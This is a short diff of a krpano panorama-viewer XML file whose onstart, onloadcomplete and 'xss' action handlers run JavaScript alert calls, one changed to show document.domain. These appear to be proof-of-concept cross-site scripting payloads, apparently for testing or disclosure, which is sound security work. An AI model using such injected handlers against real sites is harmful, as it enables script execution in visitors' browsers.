@@ -1,4 +1,4 @@
-<krpano version="1.18" onstart="js(alert('1:Start'));">
+<krpano version="1.18" onstart="js(alert(document.domain));">
 <events onloadcomplete="js(alert('2:Load'));"/>
 <action name="xss"><![CDATA[js(alert('3:Action'))]]></action>
 
